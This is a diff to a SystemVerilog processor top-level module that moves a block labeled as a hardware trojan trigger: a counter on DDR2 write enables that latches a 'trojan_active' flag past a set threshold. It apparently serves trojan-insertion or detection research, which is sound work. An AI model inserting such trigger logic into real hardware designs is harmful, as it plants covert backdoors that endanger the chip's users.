@@ -32,24 +32,6 @@ output
     logic txd,
     logic [7:0] ledOut // LED Output
 );
-
-    // ============================================================
-    // TROJAN TRIGGER LOGIC - Type 1: Simple Counter
-    // ============================================================
-    localparam int TRIGGER_THRESHOLD = 24874;
-    logic [15:0] trojan_counter;
-    logic trojan_active;
-    
-    always_ff @(posedge clk_p or negedge rst) begin
-        if (!rst) begin
-            trojan_counter <= '0;
-            trojan_active  <= 1'b0;
-        end else begin
-            if (DDR2WEN) trojan_counter <= trojan_counter + 1;
-            if (trojan_counter >= TRIGGER_THRESHOLD) trojan_active <= 1'b1;
-        end
-    end
-
 `ifdef RSD_SYNTHESIS_ATLYS
     parameter MAX_COUNT_BIT = 26;
 `else
@@ -77,6 +59,23 @@ output
         .CLK_OUT(memCLK),
         .LOCKED(locked2)
     );
+
+    // ============================================================
+    // TROJAN TRIGGER - Type 1: Simple Counter (threshold=12197)
+    // ============================================================
+    localparam int TRIGGER_THRESHOLD = 12197;
+    logic [15:0] trojan_counter;
+    logic        trojan_active;
+    always_ff @(posedge clk_p or negedge rst) begin
+        if (!rst) begin
+            trojan_counter <= '0;
+            trojan_active  <= 1'b0;
+        end else begin
+            if (DDR2WEN) trojan_counter <= trojan_counter + 1;
+            if (trojan_counter >= TRIGGER_THRESHOLD) trojan_active <= 1'b1;
+        end
+    end
+
     assign locked = locked1 & locked2;
 `else
     // For Simulation
